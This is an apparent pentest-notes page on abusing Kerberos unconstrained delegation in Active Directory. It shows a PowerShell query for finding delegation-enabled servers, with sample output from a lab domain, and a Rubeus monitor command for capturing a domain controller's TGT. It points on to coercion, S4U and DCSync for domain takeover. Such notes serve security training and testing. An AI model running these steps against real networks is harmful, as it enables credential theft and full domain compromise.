# Unconstrained delegation

Unconstrained Delegation is a mechanism in which a server will save the TGT of the users that authenticate to it in order to reuse it to access other services. When unconstrained delegation is enabled, a user could extract the TGT stored in the server.

An attack path could be coercing a privileged account (i.e. a DC machine account) to authenticate to the controlled server with unconstrained delegation enabled.



## List Unconstrained Delegation (UD) servers

```powershell
> Get-ADComputer -Filter { TrustedForDelegation -eq $True }
DistinguishedName : CN=US-WEB,CN=Computers,DC=us,DC=techcorp,DC=local
DNSHostName       : US-Web.us.techcorp.local
Enabled           : True
Name              : US-WEB
ObjectClass       : computer
ObjectGUID        : cb00dc1e-3619-4187-a02b-42f9c964a637
SamAccountName    : US-WEB$
SID               : S-1-5-21-210670787-2521448726-163245708-1110
UserPrincipalName :
```

Here, the server `US-Web` has unconstrained delegation enabled.

_Note: it is expected for domain controllers to have UD enabled._

## Exploit UD

First, on the UD server, run Rubeus in monitor mode:

```powershell
> .\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
```

Rubeus will monitor authentications from user `US-DC$` every 5 seconds.

Then, coerce the target server to authenticate to the UD server, with [coerce-authentication.md](../misc/coerce-authentication.md "mention").

Rubeus catches the TGT that `US-DC$` passes to authenticate. It is then possible to elevate privileges on the `US-DC` machine with [s4u.md](s4u.md "mention"). In addition, if the target server is a domain controller, it is possibly to directly perform a [dcsync.md](dcsync.md "mention") attack to compromise the domain.
